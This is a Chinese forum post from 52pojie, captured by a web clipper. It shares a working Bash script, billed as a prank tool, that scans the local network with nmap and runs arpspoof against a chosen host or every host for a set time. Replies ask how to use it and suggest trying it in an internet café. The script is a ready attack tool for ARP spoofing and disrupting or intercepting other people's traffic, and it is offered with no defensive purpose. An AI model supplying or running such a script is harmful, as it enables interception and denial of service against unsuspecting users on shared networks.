> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/forum.php?mod=viewthread&tid=1460197&extra=page%3D1%26filter%3Dauthor%26orderby%3Ddateline) ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)loukx1006  _ 本帖最后由 loukx1006 于 2021-6-17 13:16 编辑_  
需要 nmap 和 arpspoof  
很简单的一个小脚本，可以拿来做小恶作剧  
[Bash shell] _纯文本查看_ _复制代码_

```
#!/bin/bash
gate=$(ip route show|grep default|awk -F ' ' '{print $3}')
echo "------------------------"
echo "网关ip：$gate"
echo "------------------------"
echo "1： 指定ip"
echo "2： 全体ip"
echo "------------------------"
echo -n "选择 > "
read choice
echo "------------------------"
 
all_ip () {
    echo -n "输入要劫持的时间 > "
    read time
    echo "------------------------"
    arpspoof -i eth0 $gate & { sleep $time;kill $!;sleep 5;kill $!;sleep 5;kill $!&} > /dev/null 2>&1
}
 
choose_ip () {
    see_all=$(nmap -sn $gate/24|grep "Nmap scan"|awk -F ' ' '{print $5;print $6}'|cut -d "(" -f 2 |cut -d ")" -f 1|sed 'N;/^$/d;G')
    # |awk '++i%2' 匹配偶数行
    echo "$see_all"
    echo "------------------------"
    echo -n "输入要进行arp欺骗的ip > "
    read ip
    echo "------------------------"
    echo -n "输入要劫持的时间 > "
    read time
    echo "------------------------"
    arpspoof -i eth0 -t $ip -r $gate & { sleep $time;kill $!;sleep 5;kill $!;sleep 5;kill $!&} > /dev/null 2>&1
}
 
shutdown () {
echo "------------------------"
echo "|         关闭         |"
echo "------------------------"
}
 
if [ $choice = 1 ];then
    choose_ip
    shutdown
elif [ $choice = 2 ];then
    all_ip
    shutdown
else
    echo "输入错误"
    shutdown
fi
```

![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)rzhxw  怎么用，内网是否能用 ![](https://avatar.52pojie.cn/data/avatar/000/53/10/37_avatar_middle.jpg) tanghengvip 可以在网吧玩玩 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) DENGQG 很棒！！！先收藏起来